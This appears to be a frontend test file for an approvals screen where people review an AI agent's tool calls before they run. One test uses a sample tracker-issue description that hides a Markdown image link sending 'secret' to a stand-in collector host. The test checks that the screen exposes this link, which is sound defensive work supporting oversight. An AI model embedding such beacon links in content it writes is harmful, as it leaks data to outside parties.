import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter } from 'react-router';
import { describe, expect, it } from 'vitest';
import { App } from '../app';
import { admin, mockApi } from '../test-api';

const call = (id: string, tool: string, input: object) => ({
  id,
  tool,
  input,
  runId: 'r1',
  agent: { id: 'a1', name: 'Checkout QA' },
  task: { id: 'k1', title: 'Fix the flaky checkout total test', repository: null },
  createdAt: new Date(Date.now() - 12 * 60_000).toISOString(),
});
const openPr = call('tc1', 'code_host_open_change_request', { branch: 'agent/fix-total' });
const question = call('tc2', 'ask_owner', { question: 'Which region first?' });

function renderApprovals(approvals: object[], routes: Parameters<typeof mockApi>[0] = {}) {
  const calls = mockApi({ 'GET /api/me': admin, 'GET /api/approvals': { approvals }, ...routes });
  render(
    <MemoryRouter initialEntries={['/approvals']}>
      <App />
    </MemoryRouter>,
  );
  return { calls, user: userEvent.setup() };
}

describe('approvals', () => {
  it('approves a call and stops asking about its tool, from under Approve, saying what that changes', async () => {
    const { calls, user } = renderApprovals([openPr], {
      'POST /api/tool-calls/tc1/approve': { decision: 'approved', reason: null },
    });
    // Two answers in the row: the rarer approval is under the arrow of Approve.
    const request = within(await screen.findByRole('article', { name: 'Request' }));
    expect(request.queryByRole('button', { name: 'Approve and stop asking' })).toBeNull();
    await user.click(request.getByRole('button', { name: 'More ways to approve' }));
    const forGood = await screen.findByRole('menuitem', { name: /Approve and stop asking/ });
    expect(forGood.textContent).toContain(
      'Checkout QA uses code_host_open_change_request without your approval from now on.',
    );
    expect(forGood.textContent).toContain('Change it back in the agent’s Tools & policies.');
    await user.click(forGood);
    expect(calls.find((one) => one.route === 'POST /api/tool-calls/tc1/approve')?.body).toEqual({
      always: true,
    });
  });

  it('approves once without a word about the policy, and Deny is the plain answer', async () => {
    const { calls, user } = renderApprovals([openPr], {
      'POST /api/tool-calls/tc1/approve': { decision: 'approved', reason: null },
    });
    // The row of the list has an Approve of its own on a phone: this is the request's.
    const request = within(await screen.findByRole('article', { name: 'Request' }));
    // One colour in the row, the answer's, and that a tint: Deny is the plain button.
    expect(request.getByRole('button', { name: 'Deny' }).className).not.toMatch(/failed|refusal/);
    expect(request.getByRole('button', { name: 'Approve' }).className).toContain(
      'bg-accent-subtle',
    );
    await user.click(request.getByRole('button', { name: 'Approve' }));
    expect(
      calls.find((one) => one.route === 'POST /api/tool-calls/tc1/approve')?.body,
    ).toBeUndefined();
  });

  it('sets beside a request its facts and how far its run has come', async () => {
    const at = new Date().toISOString();
    const todo = (content: string, status: string) => ({ content, status, activeForm: content });
    renderApprovals([openPr], {
      'GET /api/runs/r1/events?after=-1': {
        events: [
          {
            seq: 0,
            at,
            type: 'tool_use',
            id: 'plan',
            name: 'TodoWrite',
            input: {
              todos: [
                todo('Read the test', 'completed'),
                todo('Open a pull request', 'in_progress'),
                todo('Tell the team', 'pending'),
              ],
            },
          },
        ],
        nextAfter: null,
      },
    });
    const about = within(await screen.findByRole('complementary', { name: 'About this request' }));
    expect(about.getByRole('link', { name: 'Checkout QA' }).getAttribute('href')).toBe(
      '/agents/a1',
    );
    expect(
      about.getByRole('link', { name: 'Fix the flaky checkout total test' }).getAttribute('href'),
    ).toBe('/tasks/k1');
    expect(about.getByRole('link', { name: 'Open the run' }).getAttribute('href')).toBe('/runs/r1');
    // The plan of the run that waits, with the step it stands on.
    expect(await about.findByRole('heading', { name: 'The run so far' })).toBeTruthy();
    expect(about.getByText('1 of 3 done')).toBeTruthy();
    expect(about.getAllByRole('listitem').map((item) => item.textContent)).toEqual([
      'Read the test',
      'Open a pull request',
      'Tell the team',
    ]);
  });

  it('has no such button for a question: a question is asked each time', async () => {
    renderApprovals([question]);
    await screen.findAllByText('Which region first?');
    expect(screen.queryByRole('button', { name: 'More ways to approve' })).toBeNull();
  });

  it('shows what Approve lets through, whole: long text, structures, and the addresses in it', async () => {
    const description = `${'A long description of the change. '.repeat(8)}![status](https://collector.example/?d=secret)`;
    const tracker = call('tc3', 'tracker__create_issue', {
      title: 'Ship it',
      description,
      labels: ['urgent', 'agent'],
    });
    const { calls, user } = renderApprovals([tracker]);
    const request = within(await screen.findByRole('article', { name: 'Request' }));
    const sends = within(request.getByLabelText('What it sends'));
    expect(sends.getByText('tracker__create_issue')).toBeTruthy();
    // Nothing left out for being long or not a word.
    expect(sends.getByText(description)).toBeTruthy();
    expect(sends.getByText(/"urgent",\s*"agent"/)).toBeTruthy();
    // The picture Markdown would draw as nothing is an address, listed.
    expect(
      within(request.getByRole('list', { name: 'Addresses in it' })).getByText(
        'https://collector.example/?d=secret',
      ),
    ).toBeTruthy();
    // No key approves.
    await user.keyboard('a');
    expect(calls.some((one) => one.route.endsWith('/approve'))).toBe(false);
  });
});
